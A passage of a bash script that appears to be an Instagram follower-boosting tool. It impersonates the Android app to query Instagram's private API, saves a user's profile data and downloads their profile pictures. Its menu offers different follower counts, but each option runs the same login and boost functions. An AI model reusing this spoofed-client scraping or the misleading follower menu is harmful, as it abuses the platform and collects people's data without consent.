curl -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/users/$user_id/info" > $user_account/profile.info
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;77m %s\e[0m\e[1;93m account info:\e[0m\n" $user_account
cat $user_account/profile.info
grep -o 'https://[^ ]*.jpg[^\ ]*.' $user_account/profile.info | cut -d '"' -f1 | tr -d '\\' | uniq > $user_account/profile_pic


printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Downloading Profile Pictures...\e[0m"
count=0
for pic in $(cat $user_account/profile_pic); do

wget -O $user_account/profile_pic$count.jpg $pic > /dev/null 2>&1
let count++
done
printf "\e[1;92mDONE\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Saved:\e[0m\e[1;77m %s/\e[0m\n" $user_account

}

menu() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m [!] 100 Followers \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m [!] 200 Followers\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m [!] 300 Followers\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m [!] 500 Followers\e[0m\n"
printf "\n"

read -p $' \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;77m Choose an option: \e[0m' option

if [[ $option -eq 1 ]]; then
login_user
increase_followers

elif [[ $option -eq 2 ]]; then
login_user
increase_followers

elif [[ $option -eq 3 ]]; then
login_user
increase_followers
elif [[ $option -eq 4 ]]; then
login_user
increase_followers

else

printf "\e[1;93m[!] Invalid Option!\e[0m\n" 
sleep 2	
menu

fi
}


banner
menu